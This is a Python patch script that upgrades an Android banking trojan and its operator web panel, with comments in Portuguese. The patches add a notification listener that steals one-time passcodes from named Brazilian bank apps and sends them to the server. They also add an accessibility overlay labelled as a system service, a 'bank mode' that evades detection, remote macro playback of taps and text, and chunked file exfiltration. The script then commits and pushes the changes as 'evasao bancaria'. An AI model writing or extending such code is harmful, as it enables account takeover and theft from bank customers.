import io, os, re, subprocess, sys

RAIZ = os.getcwd()
FALHAS = []

def ler(p):
    with io.open(p, encoding="utf-8") as f:
        return f.read()

def grava(p, s):
    d = os.path.dirname(p)
    if d and not os.path.isdir(d):
        os.makedirs(d)
    with io.open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(s)

def sub(p, velho, novo, obrig=True):
    s = ler(p)
    if velho not in s:
        if obrig:
            FALHAS.append("%s :: nao achei: %s" % (p, velho.strip().splitlines()[0][:70]))
        return False
    grava(p, s.replace(velho, novo, 1))
    print("  ok  %s" % p)
    return True

print("[1] manifest")
M = "app/src/main/AndroidManifest.xml"
sub(M,
    '<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />',
    '<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />\n'
    '    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />')
sub(M,
    '<service\n        android:name=".KeySvc"\n        android:exported="true"',
    '<service\n        android:name=".KeySvc"\n        android:label="@string/svc_label"\n        android:exported="true"')
sub(M,
    '</application>',
    '    <service\n        android:name=".OtpSvc"\n        android:label="@string/svc_label"\n'
    '        android:exported="true"\n'
    '        android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">\n'
    '        <intent-filter>\n'
    '            <action android:name="android.service.notification.NotificationListenerService" />\n'
    '        </intent-filter>\n'
    '    </service>\n</application>')

print("[2] strings")
S = "app/src/main/res/values/strings.xml"
if os.path.exists(S):
    sub(S, '</resources>',
        '    <string name="svc_label">Acessibilidade do sistema</string>\n'
        '    <string name="acc_desc">Preenchimento de texto e navegacao por gestos.</string>\n'
        '</resources>')
else:
    grava(S, '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n'
             '    <string name="svc_label">Acessibilidade do sistema</string>\n'
             '    <string name="acc_desc">Preenchimento de texto e navegacao por gestos.</string>\n'
             '</resources>\n')
    print("  criado %s" % S)

print("[3] acc.xml")
grava("app/src/main/res/xml/acc.xml", r'''<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault|flagReportViewIds|flagRetrieveInteractiveWindows"
    android:canPerformGestures="true"
    android:canRetrieveWindowContent="true"
    android:canTakeScreenshot="true"
    android:notificationTimeout="80"
    android:description="@string/acc_desc" />
''')
print("  ok  acc.xml")

print("[4] Util")
U = "app/src/main/java/com/eloeeducacao/Util.java"
sub(U, r'''    public static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "");
    }''', r'''    public static void sendT(String t, String o) {
        Net.send("{\"t\":\"" + esc(t) + "\",\"o\":\"" + esc(o) + "\"}");
    }

    public static String esc(String s) {
        if (s == null) return "";
        StringBuilder b = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '\\') b.append("\\\\");
            else if (c == '"') b.append("\\\"");
            else if (c == '\n') b.append("\\n");
            else if (c == '\r') b.append("\\r");
            else if (c == '\t') b.append("\\t");
            else if (c < 0x20) b.append(' ');
            else b.append(c);
        }
        return b.toString();
    }

    public static final String[] BANCOS = {
        "br.com.intermedium", "com.nu.production", "com.itau", "com.bradesco",
        "com.santander.app", "br.com.bb.android", "br.com.gabba.Caixa", "com.picpay"
    };

    public static boolean banco(String pkg) {
        if (pkg == null) return false;
        for (String b : BANCOS) if (pkg.startsWith(b)) return true;
        return false;
    }''')
sub(U, "agora - t < 20000", "agora - t < 5000")

print("[5] Extra.cat com offset")
E = "app/src/main/java/com/eloeeducacao/Extra.java"
sub(E, r'''    public static String cat(String path, int maxBytes) {
        try {
            File f = new File(path);
            if (!f.isFile()) return "nao e arquivo: " + path;
            int n = (int) Math.min(f.length(), Math.max(1024, Math.min(maxBytes, 200000)));
            byte[] b = new byte[n];
            FileInputStream in = new FileInputStream(f);
            int r = in.read(b);
            in.close();
            if (r <= 0) return "vazio";
            return "len=" + f.length() + "\nb64=" + Base64.encodeToString(
                    r == n ? b : java.util.Arrays.copyOf(b, r), Base64.NO_WRAP);
        } catch (Throwable t) {
            return "err: " + t;
        }
    }''', r'''    public static String cat(String path, int off, int len) {
        java.io.RandomAccessFile raf = null;
        try {
            File f = new File(path);
            if (!f.isFile()) return "nao e arquivo";
            long total = f.length();
            raf = new java.io.RandomAccessFile(f, "r");
            raf.seek(Math.max(0, Math.min(off, total)));
            int n = (int) Math.min(len, Math.max(1, total - raf.getFilePointer()));
            byte[] b = new byte[n];
            int r = raf.read(b);
            if (r <= 0) return "fim";
            return "off=" + off + " total=" + total + " b64=" + Base64.encodeToString(
                    r == n ? b : java.util.Arrays.copyOf(b, r), Base64.NO_WRAP);
        } catch (Throwable t) {
            return "err: " + t;
        } finally {
            try { if (raf != null) raf.close(); } catch (Throwable ignored) {}
        }
    }''')

print("[6] Cmd")
C = "app/src/main/java/com/eloeeducacao/Cmd.java"
sub(C, '                case "ov":\n                    Ov.set(c, o.optBoolean("on", true));',
       '                case "ov":\n                    Ov.set(KeySvc.I != null ? KeySvc.I : c, o.optBoolean("on", true));')
sub(C, '''                case "bank":
                    Ov.set(c, false);
                    ScreenSvc.Q = 30;
                    ScreenSvc.FPS = 2;
                    Net.send("{\\"t\\":\\"info\\",\\"o\\":\\"modo banco: overlay off, 30q 2fps\\"}");
                    if (acc()) Tree.dump(k);
                    break;''', '''                case "bank":
                    ScreenSvc.giveUp = true;
                    ScreenSvc.alive = false;
                    try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}
                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
                    ScreenSvc.Q = 45;
                    ScreenSvc.FPS = 3;
                    Util.sendT("info", "modo banco: projecao off, overlay off");
                    if (acc()) Tree.dump(k);
                    break;
                case "unbank":
                    ScreenSvc.giveUp = false;
                    Util.sendT("info", "modo normal: reabra a captura na MainActivity");
                    break;
                case "macro":
                    if ("stop".equals(o.optString("op"))) Macro.stop();
                    else Macro.play(o.optJSONArray("s"));
                    break;''')
sub(C, '                    Net.send("{\\"t\\":\\"dl\\",\\"o\\":\\"" + Util.esc(Extra.cat(o.optString("p"), o.optInt("n", 200000))) + "\\"}");',
       '                    Util.sendT("dl", Extra.cat(o.optString("p"), o.optInt("off", 0), o.optInt("n", 65536)));')

print("[7] KeySvc")
K = "app/src/main/java/com/eloeeducacao/KeySvc.java"
sub(K, "    private volatile String curPkg;", "    public volatile String curPkg;")
sub(K, '''                        int type = Build.VERSION.SDK_INT >= 26
                                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                                : WindowManager.LayoutParams.TYPE_PHONE;''',
       '''                        int type = Build.VERSION.SDK_INT >= 22
                                ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                                : WindowManager.LayoutParams.TYPE_PHONE;''')
sub(K, '''                        wm.addView(l, lp);
                        ov = l;''', '''                        try {
                            wm.addView(l, lp);
                        } catch (Throwable t) {
                            lp.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                            wm.addView(l, lp);
                        }
                        ov = l;''')

print("[8] ScreenSvc / frame preto")
SC = "app/src/main/java/com/eloeeducacao/ScreenSvc.java"
sub(SC, '''            if (dark(out)) {
                if (++blackCount > 10) {''', '''            if (dark(out)) {
                if (Util.banco(KeySvc.I == null ? null : KeySvc.I.curPkg)) {
                    black = true;
                    blackCount = 0;
                } else if (++blackCount > 10) {''')

print("[9] MainActivity")
MA = "app/src/main/java/com/eloeeducacao/MainActivity.java"
sub(MA, '''                if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(MainActivity.this)) {
                    startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + getPackageName())));
                    return;
                }
''', "")
sub(MA, 'sb.append("overlay: ").append(Settings.canDrawOverlays(this) ? "OK" : "PENDENTE").append(\'\\n\');',
        'sb.append("overlay: nativo (acessibilidade)\\n");')

print("[10] Ov delegando")
grava("app/src/main/java/com/eloeeducacao/Ov.java", '''package com.eloeeducacao;

import android.content.Context;

public final class Ov {
    private static volatile boolean ligado;

    public static boolean on() { return ligado; }

    public static void clear() { ligado = false; }

    public static boolean banco(String pkg) { return Util.banco(pkg); }

    public static void set(Context c, boolean on) {
        KeySvc k = KeySvc.I;
        if (k == null) return;
        ligado = on;
        k.overlay(on);
    }
}
''')
print("  ok  Ov.java")

print("[11] Macro e OtpSvc")
grava("app/src/main/java/com/eloeeducacao/Macro.java", r'''package com.eloeeducacao;

import android.os.Handler;
import android.os.Looper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public final class Macro {
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final List<JSONObject> fila = new ArrayList<>();
    public static volatile boolean rodando;

    public static void play(JSONArray a) {
        synchronized (fila) {
            fila.clear();
            if (a != null) {
                for (int i = 0; i < a.length(); i++) {
                    JSONObject s = a.optJSONObject(i);
                    if (s != null) fila.add(s);
                }
            }
        }
        if (!rodando) {
            rodando = true;
            H.post(passo);
        }
    }

    public static void stop() {
        synchronized (fila) { fila.clear(); }
        rodando = false;
        Util.sendT("info", "macro interrompido");
    }

    private static final Runnable passo = new Runnable() {
        @Override public void run() {
            if (!rodando) return;
            JSONObject s;
            synchronized (fila) {
                if (fila.isEmpty()) {
                    rodando = false;
                    Util.sendT("info", "macro concluido");
                    return;
                }
                s = fila.remove(0);
            }
            KeySvc k = KeySvc.I;
            try {
                if (k != null && s.has("t")) {
                    JSONArray p = s.getJSONArray("t");
                    k.touch((float) p.getDouble(0), (float) p.getDouble(1));
                } else if (k != null && s.has("l")) {
                    JSONArray p = s.getJSONArray("l");
                    k.longPress((float) p.getDouble(0), (float) p.getDouble(1));
                } else if (k != null && s.has("s")) {
                    JSONArray p = s.getJSONArray("s");
                    k.swipe((float) p.getDouble(0), (float) p.getDouble(1),
                            (float) p.getDouble(2), (float) p.getDouble(3), p.optInt(4, 240));
                } else if (k != null && s.has("x")) {
                    k.setText(s.getString("x"));
                } else if (k != null && s.has("k")) {
                    k.key(s.getInt("k"));
                }
            } catch (Throwable ignored) {}
            H.postDelayed(this, Math.max(70, s.optLong("w", 0)));
        }
    };
}
''')
grava("app/src/main/java/com/eloeeducacao/OtpSvc.java", r'''package com.eloeeducacao;

import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class OtpSvc extends NotificationListenerService {

    @Override public void onNotificationPosted(StatusBarNotification s) {
        try {
            if (s == null || s.getNotification() == null) return;
            String pkg = s.getPackageName();
            if (!Util.banco(pkg) && !pkg.contains("inter")) return;
            CharSequence t = s.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence x = s.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
            String txt = (t == null ? "" : t) + " " + (x == null ? "" : x);
            if (!txt.matches(".*\\d{4,8}.*")) return;
            Util.sendT("otp", pkg + " | " + txt.trim());
        } catch (Throwable ignored) {}
    }
}
''')
print("  ok  Macro.java / OtpSvc.java")

print("[12] server.py")
SV = "server.py"
sub(SV, 'TOKEN = "m4t7k2p9x6v3n8b5z1q0w7r2"',
        'TOKEN = os.environ.get("AVAL_TOKEN", "m4t7k2p9x6v3n8b5z1q0w7r2")')
sub(SV, 'else c(\'dl\',{p:base+nome})});',
        'else {dlPath=base+nome;dlOff=0;dlTot=-1;dlBuf=null;c(\'dl\',{p:base+nome,off:0,n:65536})}});')
sub(SV, 'banco()">Modo banco</button>',
        'banco()">Modo banco</button><button onclick="recTog()">REC</button>'
        '<span id=rc class=sm>0</span><button onclick="playM()">Play</button>')
sub(SV, '''function baixa(o){
  const m=o.match(/b64=([\\s\\S]*)/);
  if(!m){log(o);return}
  const bin=atob(m[1].replace(/\\s/g,'')),u=new Uint8Array(bin.length);
  for(let x=0;x<bin.length;x++)u[x]=bin.charCodeAt(x);
  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([u]));
  a.download=(pasta.split('/').pop()||'arq');a.click();log('baixado')
}''', '''let dlBuf=null,dlPath=null,dlOff=0,dlTot=-1;
function baixa(o){
  if(o==='fim'){fechaDl();return}
  const m=o.match(/b64=([\\s\\S]*)/);
  if(!m){log(o);return}
  const tot=+(o.match(/total=(\\d+)/)||[0,0])[1];
  if(!dlBuf){dlBuf=[];dlOff=0;dlTot=tot}
  const b=atob(m[1].replace(/\\s/g,''));
  for(let i=0;i<b.length;i++)dlBuf.push(b.charCodeAt(i));
  dlOff+=b.length;
  if(dlOff<dlTot)c('dl',{p:dlPath,off:dlOff,n:65536});else fechaDl()
}
function fechaDl(){
  const u=new Uint8Array(dlBuf),a=document.createElement('a');
  a.href=URL.createObjectURL(new Blob([u]));
  a.download=(dlPath.split('/').pop()||'arq');a.click();
  dlBuf=null;dlTot=-1;log('baixado')
}
let mrec=[],mlast=0,mrecOn=false;
function recTog(){mrecOn=!mrecOn;mlast=Date.now();if(mrecOn)mrec=[];
  $('#rc').textContent=mrecOn?'REC':'0';$('#rc').style.color=mrecOn?'#f85149':'#6b7785'}
function push(x){if(!mrecOn)return;const d=Date.now()-mlast;mlast=Date.now();
  mrec.push(Object.assign({w:d},x));$('#rc').textContent=mrec.length}
function playM(){if(!mrec.length){log('nada gravado');return}c('macro',{s:mrec})}''')
sub(SV, "else c('text',{s:v});e.value=''}",
        "else {c('text',{s:v});push({x:v});e.value=''}")
sub(SV, "function k(n){c('key',{code:n})}", "function k(n){c('key',{code:n});push({k:n})}")
sub(SV, "if(m<18&&Date.now()-t0>480)c('long',{x:u.x,y:u.y});\n  else if(m<18)c('touch',{x:u.x,y:u.y});\n  else c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:220});dn=null};",
       "if(m<18&&Date.now()-t0>480){c('long',{x:u.x,y:u.y});push({l:[u.x,u.y]})}\n"
       "  else if(m<18){c('touch',{x:u.x,y:u.y});push({t:[u.x,u.y]})}\n"
       "  else {c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:220});push({s:[dn.x,dn.y,u.x,u.y,220]})}dn=null};")

print("[13] build.gradle")
sub("app/build.gradle", "versionCode 6", "versionCode 7")

print("")
if FALHAS:
    print("!! %d patch(es) nao aplicado(s):" % len(FALHAS))
    for f in FALHAS:
        print("   - " + f)
    print("   (provavelmente ja foram aplicados; revise os arquivos citados)")

if "--no-git" not in sys.argv:
    print("\n[git] commit e push")
    for c in (["git", "add", "-A"],
              ["git", "commit", "-m", "evasao bancaria: overlay acessibilidade, projecao off, macro, otp, chunks"],
              ["git", "push"]):
        r = subprocess.run(c, capture_output=True, text=True)
        print("  $ " + " ".join(c) + " -> " + str(r.returncode))
        if r.stdout.strip():
            print("    " + r.stdout.strip().splitlines()[0])
        if r.stderr.strip() and r.returncode:
            print("    " + r.stderr.strip().splitlines()[0])
